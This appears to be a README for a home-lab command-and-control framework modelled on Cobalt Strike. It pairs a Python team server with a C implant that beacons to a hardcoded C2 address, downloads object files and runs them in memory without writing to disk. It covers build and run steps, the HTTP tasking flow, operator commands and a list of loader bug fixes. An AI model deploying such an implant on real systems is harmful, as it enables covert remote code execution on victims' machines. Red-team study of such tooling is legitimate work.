# BOF Project — Real-World Agent ↔ Server ↔ BOF Execution

## Architecture (Cobalt Strike-style real flow)

```
┌──────────────────────────────────────────────────┐
│  OPERATOR (you, on Kali)                         │
│  ↓ types commands in interactive shell           │
└──────────────────────────────────────────────────┘
                  │
                  ▼
┌──────────────────────────────────────────────────┐
│  TEAM SERVER (Python)                            │
│  server/server.py                               │
│  - HTTP listener on 0.0.0.0:8080                 │
│  - Operator REPL shell                           │
│  - BOF file repository (bofs/, dist/)            │
│  - Per-agent task queue                          │
└──────────────────────────────────────────────────┘
                  ▲
                  │ 1. POST /checkin {"id":"WIN_BOT_001"}
                  │ 2. GET  /task   → {task_id, bof:"bof_whoami.x64.o", args}
                  │ 3. GET  /bof/bof_whoami.x64.o   → .o binary
                  │ 4. POST /result → {output_b64, exit}
                  ▼
┌──────────────────────────────────────────────────┐
│  AGENT (agent.exe — SINGLE FILE)                 │
│  agent/agent.c → dist/agent.exe                  │
│  - Built-in HTTP client (winsock)                │
│  - Built-in COFF loader (parse + relocate + exec)│
│  - Built-in Beacon API (BeaconPrintf etc.)       │
│  - Beacon loop: sleep → checkin → exec → report  │
│  - Hardcoded: C2_HOST, C2_PORT, AGENT_ID         │
└──────────────────────────────────────────────────┘
```

## Folder structure

```
bof_project/
├── build.sh               # Compiles agent.exe (bakes in C2 IP+PORT)
├── bof_compile.sh         # Compiles all .c in bofs/ to .o files
│
├── agent/
│   └── agent.c            # Single-file agent (HTTP + loader + beacon API)
│
├── server/
│   └── server.py          # C2 server with operator REPL shell
│
├── bofs/                  # BOF source files (and built .o files)
│   ├── beacon.h
│   ├── bof_whoami.c
│   └── bof_pwd.c
│
├── dist/                  # Build output (created on first build)
│   ├── agent.exe           # (built by build.sh)
│   ├── bof_whoami.x64.o    # (built by bof_compile.sh)
│   └── bof_pwd.x64.o       # (built by bof_compile.sh)
│
└── README.md
```

## Setup & Run (on Kali Linux)

### Step 1: Build the agent

```bash
cd bof_project
chmod +x build.sh bof_compile.sh

# Build agent.exe with your server IP (Kali's IP on local network)
./build.sh 192.168.81.128 8080
# (or just ./build.sh - uses defaults 192.168.81.128:8080)
```

This produces `dist/agent.exe` (single PE32+ x86-64 binary with `C2_HOST="192.168.81.128"` and `C2_PORT=8080` baked in).

### Step 2: Build the BOFs

```bash
./bof_compile.sh
```

This auto-finds all `.c` files in `bofs/` and compiles them to `dist/*.x64.o`. Outputs:
- `dist/bof_whoami.x64.o`
- `dist/bof_pwd.x64.o`

### Step 3: Start the C2 server

```bash
python3 server/server.py
```

Output:
```
[*] HTTP listener started on 0.0.0.0:8080

============================================================
  BOF C2 Team Server - Operator Shell
  Listening on 0.0.0.0:8080
============================================================
operator>
```

### Step 4: Run the agent on Windows target

Copy `dist/agent.exe` to your Windows machine and double-click (or run from cmd). You'll see:

```
=========================================
  BOF Agent v1.0 (single-file implant)
=========================================
[*] Agent ID    : WIN_BOT_001
[*] C2 server   : 192.168.81.128:8080
[*] Sleep cycle : 5s

[+] NEW AGENT REGISTERED: WIN_BOT_001
```

Back on Kali server, you'll see the agent appear in the list.

### Step 5: Execute BOFs from operator shell

On the server (Kali):
```
operator> list
  Agent ID              Last Seen   Pending Tasks
  --------------------  --------   -------------
 * WIN_BOT_001             2s ago              0

operator> bof_exec bof_whoami
  [+] Queued BOF 'bof_whoami.x64.o' (task=t1695561234) for agent 'WIN_BOT_001'
      Agent will pick it up on next beacon (within a few seconds).
```

Agent beacons in within 5s, downloads BOF, executes in-memory, posts result. Server shows:

```
============================================================
  RESULT from WIN_BOT_001 (task=bof_whoami.x64.o, exit=0)
============================================================
[*] Username: asus
[*] SID SubAuthorityCount: 5
[+] whoami BOF complete
============================================================
operator>
```

## Operator shell commands

| Command | Description |
|---|---|
| `list` | Show connected agents (with last-seen, pending tasks) |
| `use <agent_id>` | Select active agent |
| `bof_exec <name>` | Queue BOF for execution on selected agent |
| `bofs` | List available `.o` files |
| `status` | Show server state |
| `help` | Show command help |
| `exit` | Stop server and quit |

## How real execution works (no simulation)

1. **BOF never touches disk on victim.** Agent downloads `.o` bytes into a heap buffer, parses COFF header, allocates RWX memory via `VirtualAlloc`, copies section data, applies relocations (resolving `__imp_` prefixed symbols and `LIB$FUNC` syntax via `LoadLibrary` + `GetProcAddress`).

2. **`go()` is called directly** by jumping to the in-memory address. No `CreateProcess`, no `cmd.exe`, no child process — the BOF code runs in the agent's own process space.

3. **BOF calls `BeaconPrintf`** which is implemented inside `agent.exe` itself — output is appended to a buffer in the agent's memory.

4. **After BOF returns**, agent base64-encodes the buffer and POSTs it to server, which decodes and displays to operator.

5. **Crash safety**: a Vectored Exception Handler (VEH) catches BOF access violations (like the old `0xC0000005` bug). The agent records the exception code and reports it back instead of dying silently.

## What was fixed (vs the broken version you had)

### Bug 1: `bof_compile.sh` line 34 syntax error
**Cause:** `warn(){echo ...` — missing space between `{` and `echo`.
**Fix:** Changed to `warn() { echo ...` (with space).

### Bug 2: BOF crash `exit=3221225477` (= `0xC0000005`)
**Cause:** Loader didn't handle `__imp_` prefix in COFF relocations.
**Fix:** `apply_relocations()` in `agent.c` now:
1. Detects `__imp_` prefix on symbol names
2. Strips it to get plain name
3. Resolves via Beacon API registry, then `LIB$FUNC` syntax (e.g. `ADVAPI32$GetUserNameA`), then default DLL list
4. Patches correct relocation type (`IMAGE_REL_AMD64_ADDR64`, `REL32`, etc.)

### Bug 3: `GetSidSubAuthorityCount` never resolved
**Cause:** Original BOF source used plain name without `ADVAPI32$` prefix.
**Fix:** `bofs/bof_whoami.c` now declares it as `ADVAPI32$GetSidSubAuthorityCount`.

### Bug 4: Ctrl+C → Python traceback crash
**Cause:** `beacon_loop()` in old Python implant didn't catch `KeyboardInterrupt`.
**Fix:** Agent is now written in C — Ctrl+C on agent just kills the process (Windows behavior). On the server side, `operator_shell()` catches `KeyboardInterrupt` cleanly.

## Adding your own BOFs

1. Drop a new `bof_xyz.c` file in `bofs/`
2. Make sure to `#include "beacon.h"`
3. Declare external Win32 APIs with `LIB$FUNC` syntax:
   ```c
   DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI ADVAPI32$LookupAccountSidA(
       LPCSTR, PSID, LPSTR, LPDWORD, LPSTR, LPDWORD, PSID_NAME_USE);
   ```
4. Implement `void go(char* args, int args_len)`
5. Use `BeaconPrintf(CALLBACK_OUTPUT, "msg")` for output
6. Run `./bof_compile.sh` — it auto-detects and compiles the new BOF

## Verify symbols in a built BOF

```bash
x86_64-w64-mingw32-objdump -t dist/bof_whoami.x64.o | head -20
```

You should see:
- `go` symbol (entry point)
- `ADVAPI32$...`, `KERNEL32$...` (all external calls with `$` prefix)
- `BeaconPrintf` (plain, no `__imp_` because of `-DBOF_NO_DLLIMPORT=1`)

If you see unresolved plain names like `GetSidSubAuthorityCount` without `$` prefix, **the BOF source is wrong** — fix it and rebuild.
